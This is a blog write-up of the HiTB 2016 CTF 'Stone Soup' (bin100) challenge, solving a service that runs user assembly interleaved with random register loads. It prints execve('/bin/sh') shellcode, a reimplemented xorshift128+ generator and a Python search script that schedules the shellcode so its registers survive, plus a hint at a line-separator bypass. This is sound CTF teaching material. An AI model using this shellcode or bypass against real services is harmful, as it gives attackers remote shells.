Title: bin100 - Stone Soup
Author: doskop
Date: 2016-05-29 11:12
Tags: CTF

## Introduction

This is a write-up for the bin100 challenge of the HiTB 2016 CTF.

>Nowadays in the times of cyber warfare it is important that code provided by
> attackers is executed in a safe way. Our shellcode prevention technology, dubbed
> "stone soup", has provided us with years of sekjurity.
> You'll find this service to be running on 145.111.225.50:33533.
>
> Source code for this service is available [here]({filename}/downloads/hitb-2016-ctf/bin100/bfefa7a53e0ff7dd91242adb8edc2315_stone_soup.py).

## Analysis

The program allows you to feed it assembler instructions for the x86\_64 architecture. It starts out by settings all registers (except for `RSP`) to a random values. It then adds your instructions but adds 8 register loads for random registers using random values after each statement where statements are separated by ; or \\n. Finally it assembles the program using keystone engine and executes it.

There are a couple of ways to solve this one: The easy ways would be to find a way to manipulate the program to allow chaining assembler instructions without it noticing (hint: try `\r` instead of `\n`) or tricking keystone engine into ignoring the register loads. The hard way would be to find a solution where the register loads don't matter. Needless to say, I took the hard path.

## Exploitation

First, let's create some shellcode using intel syntax (the default for keystone-engine) that defers loading the registers as long as possible and in a way where we can easily change their order:

    :::nasm
    sub rsp, 8
    mov qword ptr [rsp], 1852400175
    mov qword ptr [rsp + 4], 6845231
    push 0
    push 0
    push rsp
    add dword ptr [rsp], 16
    push rsp
    push rsp
    add dword ptr [rsp], 32
    mov rax, 59
    xor rdx, rdx
    mov rsi, qword ptr [rsp + 8]
    mov rdi, qword ptr [rsp]
    syscall

This basically pushes `/bin/sh` to the stack, creates an array structure on the stack call calls the `execve` syscall like this: `syscall_execve('/bin/sh\0', ['/bin/sh', 0], 0)`.

Since the random number generator is very predictable and generates the same sequence on every run, let's find a state where the registers we need aren't destroyed.

We start by lifting the prng from the challenge:

	:::python
    def xs128p(state0, state1):
        # https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f
        s1 = state0 & ((1 << 64) - 1)
        s0 = state1 & ((1 << 64) - 1)

        s1 ^= (s1 << 23) & ((1 << 64) - 1)
        s1 ^= (s1 >> 17) & ((1 << 64) - 1)
        s1 ^= s0 & ((1 << 64) - 1)
        s1 ^= (s0 >> 26) & ((1 << 64) - 1)

        state0 = state1 & ((1 << 64) - 1)
        state1 = s1 & ((1 << 64) - 1)

        generated = (state0 + state1) & ((1 << 64) - 1)
        return state0, state1, generated

    def prng():
        state0, state1 = struct.unpack("QQ", "HACKINTHEBOX2016")
        while True:
            state0, state1, value = xs128p(state0, state1)
            yield value

And create a function that tries to find a state in the random generator where a given set of registers isn't destroyed before the next instruction (not only do the registers have to survive all 4 registers loads, it also needs to get to the syscall with the registers intact):

	:::python
    def find_solution(save_regs):
    	# Initialise the PRNG and set the initial state
        p = prng()
        for x in xrange(15):
            next(p)
        
        # Here we keep track of which registers we've saved so far.
        saved_regs = []
        
        for i in itertools.count(1):
        	# Create a list of registers that are destroyed in this round:
            destroyed = []
            for x in xrange(8):
                destroyed.append(regs[next(p) % 15])
                next(p)
            
            # Check if we're destroying any of the registers we've saved so far:
            if set(destroyed) & set(saved_regs):
                saved_regs = []
                continue
            
            # Are we done yet?
            if len(saved_regs) == len(save_regs):
                print saved_regs, 'after', i
                break
            
            # Pick the next register we will try to save:
            want_reg = save_regs[len(saved_regs)]
            saved_regs.append(want_reg)

Now, we run this for every permutation of the registers we want to save (`rax`, `rdx`, `rdi` and `rsi`):

	:::python
    for save_regs in itertools.permutations(['rdx', 'rax', 'rdi', 'rsi']):
	    find_solution(save_regs)

You can find the full script [here]({filename}/downloads/hitb-2016-ctf/bin100/find_shortest_path.py).

This gives us a number of solutions, the shortest being:

	['rsi', 'rdi', 'rdx', 'rax'] after 67

This tells use that the register loads in the order `rsi`, `rdi`, `rdx`, `rax` should finish on line 67 of the assembler script and the syscall should be on line 68. Applying this knowledge to the original shellcode gives us [this]({filename}/downloads/hitb-2016-ctf/bin100/shellcode_input.asm). If you were to feed this to the service you end up with [this]({filename}/downloads/hitb-2016-ctf/bin100/shellcode_output.asm). Lo and behold, our registers remain intact.

Send the to the service and you'll get a remote shell.